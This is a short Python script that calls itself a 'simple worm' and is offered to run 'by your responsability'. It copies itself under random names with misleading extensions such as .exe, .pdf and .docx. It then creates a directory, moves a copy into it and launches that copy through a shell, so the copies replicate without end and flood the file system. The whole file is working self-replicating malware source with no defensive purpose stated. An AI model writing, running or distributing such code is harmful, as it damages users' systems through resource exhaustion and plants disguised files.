#Simple worm, create random files, then will reproduce itself into directories.
#Run by your responsability
import shutil
import sys
from random import randint
from time import sleep
import subprocess
import os


file_ext = ['.txt', '.c', '.java', '.html', '.mp3', '.mp4', '.jar', '.bin', '.png', '.cs', '.exe', '.avi', '.apk',
'.xlsx', '.docx', '.pptx', '.pdf', '.deb', '.dll', '']

##ARG FUNCTION
def multiply_worm():
    filename = ""
    extention = ""
    _file = ""
    if len(sys.argv) == 1:
        
        for times in range(10):
            filename = ""
            for letter in range(0,10):
                filename += chr(randint(64, 90))
            
            sleep(0.6)
            extention = file_ext[randint(0, len(file_ext) -1 )]
            shutil.copy(sys.argv[0], filename + extention) #Interact with files in an OS
        _file = filename + extention      

        shutil.copy(_file, filename + '.py')
        os.mkdir(filename)
        src_dir = os.getcwd()
        dest_file = src_dir + '/' + filename + '/' + filename + '.py'  
        shutil.move(filename + '.py', dest_file)
        os.chdir(filename)
        print("Current dir: {}\n".format(os.getcwd()))
        os.system('ls -l')
        cmd = 'python ' + filename + '.py'
        sp = subprocess.call([cmd], shell=True)
        if sp == 0:
            print("Executing new worm")
        else:
            print("No worm executed exit code: {}".format(int(sp)))
        exit()

if __name__ == "__main__":
    try:
        multiply_worm()
    except Exception as e:
        print("Error: {}".format(e))